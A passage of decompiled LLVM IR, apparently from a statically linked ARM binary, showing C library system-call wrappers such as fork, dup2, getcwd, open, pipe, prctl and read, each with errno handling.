  br i1 %v4_f4e0, label %dec_label_pc_f4e8, label %bb2

dec_label_pc_f4e8:                                ; preds = %bb1
  %v0_f4e8 = call i32 @fork()
  store i32 %v0_f4e8, i32* @r0, align 4
  %v2_f4ec = icmp ugt i32 %v0_f4e8, -4097
  br i1 %v2_f4ec, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_f4e8
  %v0_f4f4 = call i32 @__syscall_error()
  ret i32 %v0_f4f4

; uselistorder directives
  uselistorder i32 %v0_f4e8, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_f500 = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @ip, align 4
  %v1_f510 = add i32 %arg2, -12
  store i32 %v6_f500, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_f510, 2
  br i1 %tmp, label %dec_label_pc_f538, label %dec_label_pc_f530

dec_label_pc_f530:                                ; preds = %entry
  %v0_f530 = call i32 @__GI_fcntl64()
  br label %dec_label_pc_f564

dec_label_pc_f538:                                ; preds = %entry
  %v2_f540 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_f540, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_f540, -4095
  br i1 %tmp8, label %dec_label_pc_f564, label %dec_label_pc_f550

dec_label_pc_f550:                                ; preds = %dec_label_pc_f538
  %v0_f550 = call i32 @__errno_location()
  %v0_f554 = load i32, i32* %r4.global-to-local, align 4
  %v1_f554 = sub i32 0, %v0_f554
  %v2_f558 = inttoptr i32 %v0_f550 to i32*
  store i32 %v1_f554, i32* %v2_f558, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f564

dec_label_pc_f564:                                ; preds = %dec_label_pc_f550, %dec_label_pc_f538, %dec_label_pc_f530
  %storemerge = phi i32 [ %v0_f530, %dec_label_pc_f530 ], [ %v2_f540, %dec_label_pc_f538 ], [ -1, %dec_label_pc_f550 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_f540, { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_f594 = load i32, i32* @r0, align 4
  store i32 %v0_f594, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f594, -4095
  br i1 %tmp, label %dec_label_pc_f5b0, label %dec_label_pc_f5a0

dec_label_pc_f5a0:                                ; preds = %entry
  %v0_f5a0 = call i32 @__errno_location()
  %v0_f5a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f5a4 = sub i32 0, %v0_f5a4
  %v2_f5a8 = inttoptr i32 %v0_f5a0 to i32*
  store i32 %v1_f5a4, i32* %v2_f5a8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f5b0

dec_label_pc_f5b0:                                ; preds = %entry, %dec_label_pc_f5a0
  %v0_f5b0 = phi i32 [ %v0_f594, %entry ], [ -1, %dec_label_pc_f5a0 ]
  ret i32 %v0_f5b0

; uselistorder directives
  uselistorder i32 %v0_f594, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f5b0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f5ec = load i32, i32* @r4, align 4
  store i32 %v3_f5ec, i32* %stack_var_-8, align 4
  %v0_f5f0 = call i32 @chdir()
  store i32 %v0_f5f0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f5f0, -4095
  br i1 %tmp, label %dec_label_pc_f610, label %dec_label_pc_f600

dec_label_pc_f600:                                ; preds = %entry
  %v0_f600 = call i32 @__errno_location()
  %v0_f604 = load i32, i32* %r4.global-to-local, align 4
  %v1_f604 = sub i32 0, %v0_f604
  %v2_f608 = inttoptr i32 %v0_f600 to i32*
  store i32 %v1_f604, i32* %v2_f608, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f610

dec_label_pc_f610:                                ; preds = %entry, %dec_label_pc_f600
  %v0_f610 = phi i32 [ %v0_f5f0, %entry ], [ -1, %dec_label_pc_f600 ]
  %v2_f614 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f614, i32* @r4, align 4
  ret i32 %v0_f610

; uselistorder directives
  uselistorder i32 %v0_f5f0, { 1, 0, 2 }
  uselistorder i32 ()* @chdir, { 1, 0 }
  uselistorder label %dec_label_pc_f610, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f618 = load i32, i32* @r4, align 4
  store i32 %v3_f618, i32* %stack_var_-8, align 4
  %v1_f61c = call i32 @close(i32 %arg1)
  store i32 %v1_f61c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_f61c, -4095
  br i1 %tmp, label %dec_label_pc_f63c, label %dec_label_pc_f62c

dec_label_pc_f62c:                                ; preds = %entry
  %v0_f62c = call i32 @__errno_location()
  %v0_f630 = load i32, i32* %r4.global-to-local, align 4
  %v1_f630 = sub i32 0, %v0_f630
  %v2_f634 = inttoptr i32 %v0_f62c to i32*
  store i32 %v1_f630, i32* %v2_f634, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f63c

dec_label_pc_f63c:                                ; preds = %entry, %dec_label_pc_f62c
  %v0_f63c = phi i32 [ %v1_f61c, %entry ], [ -1, %dec_label_pc_f62c ]
  %v2_f640 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f640, i32* @r4, align 4
  ret i32 %v0_f63c

; uselistorder directives
  uselistorder i32 %v1_f61c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f63c, { 1, 0 }
}

define i32 @dup2() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f644 = load i32, i32* @r4, align 4
  store i32 %v3_f644, i32* %stack_var_-8, align 4
  %v0_f648 = call i32 @dup2()
  store i32 %v0_f648, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f648, -4095
  br i1 %tmp, label %dec_label_pc_f668, label %dec_label_pc_f658

dec_label_pc_f658:                                ; preds = %entry
  %v0_f658 = call i32 @__errno_location()
  %v0_f65c = load i32, i32* %r4.global-to-local, align 4
  %v1_f65c = sub i32 0, %v0_f65c
  %v2_f660 = inttoptr i32 %v0_f658 to i32*
  store i32 %v1_f65c, i32* %v2_f660, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f668

dec_label_pc_f668:                                ; preds = %entry, %dec_label_pc_f658
  %v0_f668 = phi i32 [ %v0_f648, %entry ], [ -1, %dec_label_pc_f658 ]
  %v2_f66c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f66c, i32* @r4, align 4
  ret i32 %v0_f668

; uselistorder directives
  uselistorder i32 %v0_f648, { 1, 0, 2 }
  uselistorder i32 ()* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f668, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f670 = load i32, i32* @r4, align 4
  store i32 %v3_f670, i32* %stack_var_-8, align 4
  %v0_f674 = call i32 @fork()
  store i32 %v0_f674, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f674, -4095
  br i1 %tmp, label %dec_label_pc_f694, label %dec_label_pc_f684

dec_label_pc_f684:                                ; preds = %entry
  %v0_f684 = call i32 @__errno_location()
  %v0_f688 = load i32, i32* %r4.global-to-local, align 4
  %v1_f688 = sub i32 0, %v0_f688
  %v2_f68c = inttoptr i32 %v0_f684 to i32*
  store i32 %v1_f688, i32* %v2_f68c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f694

dec_label_pc_f694:                                ; preds = %entry, %dec_label_pc_f684
  %v0_f694 = phi i32 [ %v0_f674, %entry ], [ -1, %dec_label_pc_f684 ]
  %v2_f698 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f698, i32* @r4, align 4
  ret i32 %v0_f694

; uselistorder directives
  uselistorder i32 %v0_f674, { 1, 0, 2 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %dec_label_pc_f694, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_f69c = load i32, i32* @r4, align 4
  store i32 %v3_f69c, i32* %stack_var_-20, align 4
  %v6_f69c = load i32, i32* @r5, align 4
  %v9_f69c = load i32, i32* @r6, align 4
  %v12_f69c = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  %v2_f6a0 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r5, align 4
  %v2_f6ac = icmp eq i32 %arg1, 0
  br i1 %v2_f6a0, label %dec_label_pc_f6ac, label %dec_label_pc_f6dc

dec_label_pc_f6ac:                                ; preds = %entry
  br i1 %v2_f6ac, label %dec_label_pc_f6c8, label %dec_label_pc_f6b4

dec_label_pc_f6b4:                                ; preds = %dec_label_pc_f6ac
  %v0_f6b4 = call i32 @__errno_location()
  %v0_f6b8 = load i32, i32* @r7, align 4
  store i32 %v0_f6b8, i32* @r5, align 4
  %v2_f6c0 = inttoptr i32 %v0_f6b4 to i32*
  store i32 22, i32* %v2_f6c0, align 4
  br label %dec_label_pc_f76c

dec_label_pc_f6c8:                                ; preds = %dec_label_pc_f6ac
  %v0_f6c8 = call i32 @__GI_getpagesize()
  %v5_f6d0 = icmp slt i32 %v0_f6c8, 4096
  br i1 %v5_f6d0, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_f6c8
  store i32 %v0_f6c8, i32* @r4, align 4
  br label %dec_label_pc_f6ec

bb15:                                             ; preds = %dec_label_pc_f6c8
  store i32 4096, i32* @r4, align 4
  br label %dec_label_pc_f6ec

dec_label_pc_f6dc:                                ; preds = %entry
  store i32 %arg2, i32* @r4, align 4
  br i1 %v2_f6ac, label %dec_label_pc_f6ec, label %bb16

bb16:                                             ; preds = %dec_label_pc_f6dc
  store i32 %arg1, i32* @r6, align 4
  br label %dec_label_pc_f6fc

dec_label_pc_f6ec:                                ; preds = %dec_label_pc_f6dc, %bb, %bb15
  %v0_f6ec = phi i32 [ %v0_f6c8, %bb ], [ 4096, %bb15 ], [ %arg2, %dec_label_pc_f6dc ]
  %v1_f6f0 = call i32 @malloc(i32 %v0_f6ec)
  store i32 %v1_f6f0, i32* @r6, align 4
  %v2_f6f4 = icmp eq i32 %v1_f6f0, 0
  br i1 %v2_f6f4, label %dec_label_pc_f768, label %dec_label_pc_f6ec.dec_label_pc_f6fc_crit_edge

dec_label_pc_f6ec.dec_label_pc_f6fc_crit_edge:    ; preds = %dec_label_pc_f6ec
  %v0_f6fc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f6fc

dec_label_pc_f6fc:                                ; preds = %bb16, %dec_label_pc_f6ec.dec_label_pc_f6fc_crit_edge
  %v0_f700 = phi i32 [ %v1_f6f0, %dec_label_pc_f6ec.dec_label_pc_f6fc_crit_edge ], [ %arg1, %bb16 ]
  %v0_f6fc = phi i32 [ %v0_f6fc.pre, %dec_label_pc_f6ec.dec_label_pc_f6fc_crit_edge ], [ %arg2, %bb16 ]
  %v2_f704 = call i32 @getcwd(i32 %v0_f700, i32 %v0_f6fc)
  store i32 %v2_f704, i32* @r4, align 4
  %tmp = icmp ult i32 %v2_f704, -4095
  br i1 %tmp, label %dec_label_pc_f724, label %dec_label_pc_f714

dec_label_pc_f714:                                ; preds = %dec_label_pc_f6fc
  %v0_f714 = call i32 @__errno_location()
  %v0_f718 = load i32, i32* @r4, align 4
  %v1_f718 = sub i32 0, %v0_f718
  %v2_f71c = inttoptr i32 %v0_f714 to i32*
  store i32 %v1_f718, i32* %v2_f71c, align 4
  br label %dec_label_pc_f754

dec_label_pc_f724:                                ; preds = %dec_label_pc_f6fc
  %v1_f724 = icmp slt i32 %v2_f704, 0
  br i1 %v1_f724, label %dec_label_pc_f754, label %dec_label_pc_f72c

dec_label_pc_f72c:                                ; preds = %dec_label_pc_f724
  %v0_f72c = load i32, i32* @r5, align 4
  %v2_f72c = icmp eq i32 %v0_f72c, 0
  br i1 %v2_f72c, label %bb17, label %dec_label_pc_f748.thread7

dec_label_pc_f748.thread7:                        ; preds = %dec_label_pc_f72c
  br label %dec_label_pc_f76c

bb17:                                             ; preds = %dec_label_pc_f72c
  %v1_f730 = load i32, i32* @r7, align 4
  %v3_f730 = icmp eq i32 %v1_f730, 0
  br i1 %v3_f730, label %dec_label_pc_f748, label %dec_label_pc_f748.thread

dec_label_pc_f748.thread:                         ; preds = %bb17
  br label %bb18

dec_label_pc_f748:                                ; preds = %bb17
  %v0_f73c = load i32, i32* @r6, align 4
  %v2_f740 = call i32 @realloc(i32 %v0_f73c, i32 %v2_f704)
  store i32 %v2_f740, i32* @r5, align 4
  %v2_f748 = icmp eq i32 %v2_f740, 0
  br i1 %v2_f748, label %bb18, label %dec_label_pc_f76c

bb18:                                             ; preds = %dec_label_pc_f748.thread, %dec_label_pc_f748
  %v1_f74c = load i32, i32* @r6, align 4
  store i32 %v1_f74c, i32* @r5, align 4
  br label %dec_label_pc_f76c

dec_label_pc_f754:                                ; preds = %dec_label_pc_f724, %dec_label_pc_f714
  %v0_f754 = load i32, i32* @r5, align 4
  %v2_f754 = icmp eq i32 %v0_f754, 0
  br i1 %v2_f754, label %dec_label_pc_f75c, label %dec_label_pc_f768

dec_label_pc_f75c:                                ; preds = %dec_label_pc_f754
  %v0_f75c = load i32, i32* @r6, align 4
  store i32 %v0_f75c, i32* @r0, align 4
  %v0_f760 = call i32 @free()
  br label %dec_label_pc_f76c

dec_label_pc_f768:                                ; preds = %dec_label_pc_f754, %dec_label_pc_f6ec
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_f76c

dec_label_pc_f76c:                                ; preds = %dec_label_pc_f748.thread7, %bb18, %dec_label_pc_f748, %dec_label_pc_f75c, %dec_label_pc_f6b4, %dec_label_pc_f768
  %v0_f76c = load i32, i32* @r5, align 4
  %v2_f770 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_f770, i32* @r4, align 4
  store i32 %v6_f69c, i32* @r5, align 4
  store i32 %v9_f69c, i32* @r6, align 4
  store i32 %v12_f69c, i32* @r7, align 4
  ret i32 %v0_f76c

; uselistorder directives
  uselistorder i32 %v2_f704, { 2, 1, 0, 3 }
  uselistorder i32 %v0_f6c8, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_f76c, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_f6fc, { 1, 0 }
  uselistorder label %dec_label_pc_f6ec, { 0, 2, 1 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_f778 = ptrtoint i32* %stack_var_-12 to i32
  %v2_f784 = call i32 @getrlimit(i32 7, i32 %v2_f778)
  %v1_f788 = icmp slt i32 %v2_f784, 0
  br i1 %v1_f788, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v5_f790 = load i32, i32* %stack_var_-12, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_f798 = phi i32 [ 256, %entry ], [ %v5_f790, %bb ]
  ret i32 %v5_f798

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v2_f7a0 = load i32, i32* @global_var_28aac.293, align 4
  %v2_f7a4 = icmp eq i32 %v2_f7a0, 0
  br i1 %v2_f7a4, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_f7ac = phi i32 [ %v2_f7a0, %entry ], [ 4096, %bb ]
  ret i32 %v1_f7ac

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f7b4 = load i32, i32* @r4, align 4
  store i32 %v3_f7b4, i32* %stack_var_-8, align 4
  %v0_f7b8 = call i32 @getpid()
  store i32 %v0_f7b8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f7b8, -4095
  br i1 %tmp, label %dec_label_pc_f7d8, label %dec_label_pc_f7c8

dec_label_pc_f7c8:                                ; preds = %entry
  %v0_f7c8 = call i32 @__errno_location()
  %v0_f7cc = load i32, i32* %r4.global-to-local, align 4
  %v1_f7cc = sub i32 0, %v0_f7cc
  %v2_f7d0 = inttoptr i32 %v0_f7c8 to i32*
  store i32 %v1_f7cc, i32* %v2_f7d0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_f7d8:                                ; preds = %entry, %dec_label_pc_f7c8
  %v0_f7d8 = phi i32 [ %v0_f7b8, %entry ], [ -1, %dec_label_pc_f7c8 ]
  %v2_f7dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f7dc, i32* @r4, align 4
  ret i32 %v0_f7d8

; uselistorder directives
  uselistorder i32 %v0_f7b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f7d8, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f7e0 = load i32, i32* @r4, align 4
  store i32 %v3_f7e0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f804, label %dec_label_pc_f7f4

dec_label_pc_f7f4:                                ; preds = %entry
  %v0_f7f4 = call i32 @__errno_location()
  %v0_f7f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_f7f8 = sub i32 0, %v0_f7f8
  %v2_f7fc = inttoptr i32 %v0_f7f4 to i32*
  store i32 %v1_f7f8, i32* %v2_f7fc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_f808.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f804

dec_label_pc_f804:                                ; preds = %entry, %dec_label_pc_f7f4
  %v2_f808 = phi i32 [ %v3_f7e0, %entry ], [ %v2_f808.pre, %dec_label_pc_f7f4 ]
  %v0_f804 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f7f4 ]
  store i32 %v2_f808, i32* @r4, align 4
  ret i32 %v0_f804

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f804, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_f828 = load i32, i32* @r0, align 4
  %v3_f828 = call i32 @ioctl(i32 %v0_f828, i32 %arg1, i32 %arg2)
  store i32 %v3_f828, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_f828, -4095
  br i1 %tmp, label %dec_label_pc_f848, label %dec_label_pc_f838

dec_label_pc_f838:                                ; preds = %entry
  %v0_f838 = call i32 @__errno_location()
  %v0_f83c = load i32, i32* %r4.global-to-local, align 4
  %v1_f83c = sub i32 0, %v0_f83c
  %v2_f840 = inttoptr i32 %v0_f838 to i32*
  store i32 %v1_f83c, i32* %v2_f840, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f848

dec_label_pc_f848:                                ; preds = %entry, %dec_label_pc_f838
  %v0_f848 = phi i32 [ %v3_f828, %entry ], [ -1, %dec_label_pc_f838 ]
  ret i32 %v0_f848

; uselistorder directives
  uselistorder i32 %v3_f828, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f848, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f85c = load i32, i32* @r4, align 4
  store i32 %v3_f85c, i32* %stack_var_-8, align 4
  %v0_f860 = call i32 @kill()
  store i32 %v0_f860, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f860, -4095
  br i1 %tmp, label %dec_label_pc_f880, label %dec_label_pc_f870

dec_label_pc_f870:                                ; preds = %entry
  %v0_f870 = call i32 @__errno_location()
  %v0_f874 = load i32, i32* %r4.global-to-local, align 4
  %v1_f874 = sub i32 0, %v0_f874
  %v2_f878 = inttoptr i32 %v0_f870 to i32*
  store i32 %v1_f874, i32* %v2_f878, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f880

dec_label_pc_f880:                                ; preds = %entry, %dec_label_pc_f870
  %v0_f880 = phi i32 [ %v0_f860, %entry ], [ -1, %dec_label_pc_f870 ]
  %v2_f884 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f884, i32* @r4, align 4
  ret i32 %v0_f880

; uselistorder directives
  uselistorder i32 %v0_f860, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f880, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_f898 = and i32 %arg2, 64
  %v2_f898 = icmp eq i32 %v1_f898, 0
  br i1 %v2_f898, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v6_f888 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_f888, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_f8a8 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_f8a8, i32* @r2, align 4
  %v4_f8b0 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_f8b4 = icmp eq i32 %v4_f8b0, -4096
  store i1 %v7_f8b4, i1* @cpsr_z, align 1
  store i32 %v4_f8b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_f8b0, -4095
  br i1 %tmp, label %dec_label_pc_f8d0, label %dec_label_pc_f8c0

dec_label_pc_f8c0:                                ; preds = %.thread1
  %v0_f8c0 = call i32 @__errno_location()
  %v0_f8c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f8c4 = sub i32 0, %v0_f8c4
  %v2_f8c8 = inttoptr i32 %v0_f8c0 to i32*
  store i32 %v1_f8c4, i32* %v2_f8c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f8d0

dec_label_pc_f8d0:                                ; preds = %.thread1, %dec_label_pc_f8c0
  %v0_f8d0 = phi i32 [ %v4_f8b0, %.thread1 ], [ -1, %dec_label_pc_f8c0 ]
  ret i32 %v0_f8d0

; uselistorder directives
  uselistorder i32 %v4_f8b0, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_f8d0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_f8ec = load i32, i32* @r0, align 4
  %v2_f8ec = inttoptr i32 %v0_f8ec to i8*
  %v3_f8ec = call i32 @__libc_open(i8* %v2_f8ec, i32 577)
  %v0_f8f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f8f0, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_f8f0 = and i32 %v3_f8ec, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_f8f0 = phi i32 [ %v3_f8ec, %entry ], [ %v6_f8f0, %bb ]
  ret i32 %v7_f8f0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f8f4 = load i32, i32* @r4, align 4
  store i32 %v3_f8f4, i32* %stack_var_-8, align 4
  %v1_f8f8 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_f8f8 = call i32 @pipe([2 x i32] %v1_f8f8)
  store i32 %v2_f8f8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_f8f8, -4095
  br i1 %tmp, label %dec_label_pc_f918, label %dec_label_pc_f908

dec_label_pc_f908:                                ; preds = %entry
  %v0_f908 = call i32 @__errno_location()
  %v0_f90c = load i32, i32* %r4.global-to-local, align 4
  %v1_f90c = sub i32 0, %v0_f90c
  %v2_f910 = inttoptr i32 %v0_f908 to i32*
  store i32 %v1_f90c, i32* %v2_f910, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f918

dec_label_pc_f918:                                ; preds = %entry, %dec_label_pc_f908
  %v0_f918 = phi i32 [ %v2_f8f8, %entry ], [ -1, %dec_label_pc_f908 ]
  %v2_f91c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f91c, i32* @r4, align 4
  ret i32 %v0_f918

; uselistorder directives
  uselistorder i32 %v2_f8f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f918, { 1, 0 }
}

define i32 @prctl() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f920 = load i32, i32* @r4, align 4
  store i32 %v3_f920, i32* %stack_var_-8, align 4
  %v0_f928 = call i32 @prctl()
  store i32 %v0_f928, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f928, -4095
  br i1 %tmp, label %dec_label_pc_f948, label %dec_label_pc_f938

dec_label_pc_f938:                                ; preds = %entry
  %v0_f938 = call i32 @__errno_location()
  %v0_f93c = load i32, i32* %r4.global-to-local, align 4
  %v1_f93c = sub i32 0, %v0_f93c
  %v2_f940 = inttoptr i32 %v0_f938 to i32*
  store i32 %v1_f93c, i32* %v2_f940, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f948

dec_label_pc_f948:                                ; preds = %entry, %dec_label_pc_f938
  %v0_f948 = phi i32 [ %v0_f928, %entry ], [ -1, %dec_label_pc_f938 ]
  %v2_f94c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f94c, i32* @r4, align 4
  ret i32 %v0_f948

; uselistorder directives
  uselistorder i32 %v0_f928, { 1, 0, 2 }
  uselistorder i32 ()* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_f948, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f950 = load i32, i32* @r4, align 4
  store i32 %v3_f950, i32* %stack_var_-8, align 4
  %v1_f954 = load i32, i32* @r1, align 4
  %v2_f954 = inttoptr i32 %v1_f954 to i32*
  %v3_f954 = load i32, i32* @r2, align 4
  %v4_f954 = call i32 @read(i32 %arg1, i32* %v2_f954, i32 %v3_f954)
  store i32 %v4_f954, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_f954, -4095
  br i1 %tmp, label %dec_label_pc_f974, label %dec_label_pc_f964

dec_label_pc_f964:                                ; preds = %entry
  %v0_f964 = call i32 @__errno_location()
  %v0_f968 = load i32, i32* %r4.global-to-local, align 4
  %v1_f968 = sub i32 0, %v0_f968
  %v2_f96c = inttoptr i32 %v0_f964 to i32*
  store i32 %v1_f968, i32* %v2_f96c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f974

dec_label_pc_f974:                                ; preds = %entry, %dec_label_pc_f964
  %v0_f974 = phi i32 [ %v4_f954, %entry ], [ -1, %dec_label_pc_f964 ]
  %v2_f978 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f978, i32* @r4, align 4
  ret i32 %v0_f974

; uselistorder directives
  uselistorder i32 %v4_f954, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f974, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f97c = load i32, i32* @r4, align 4
  store i32 %v3_f97c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f9a4, label %dec_label_pc_f994

dec_label_pc_f994:                                ; preds = %entry
  %v0_f994 = call i32 @__errno_location()
  %v0_f998 = load i32, i32* %r4.global-to-local, align 4
  %v1_f998 = sub i32 0, %v0_f998
  %v2_f99c = inttoptr i32 %v0_f994 to i32*
  store i32 %v1_f998, i32* %v2_f99c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_f9a8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f9a4

dec_label_pc_f9a4:                                ; preds = %entry, %dec_label_pc_f994
